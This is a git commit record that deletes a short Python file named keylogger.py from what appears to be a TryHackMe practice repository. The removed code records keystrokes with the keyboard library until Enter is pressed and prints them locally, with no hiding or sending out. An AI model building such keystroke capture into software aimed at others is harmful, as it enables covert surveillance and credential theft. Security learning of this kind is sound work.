d8db2e994d39569f54ce5f1bebddba73ea4331e4
Ismael Montoro Peñasco <ismaelmontorop@protonmail.com>
2024-05-13 11:33:17 +0200

    PG0000078

--- tryhackme/python/Src/keylogger.py
+++
@@ -1,9 +0,0 @@
-import keyboard
-keys = keyboard.record(until ='ENTER')
-
-for letra in keys:
-    if letra.event_type == 'down':
-        if letra.name.lower() != "enter":
-            print(letra.name, end="")
-
-# keyboard.play(keys)
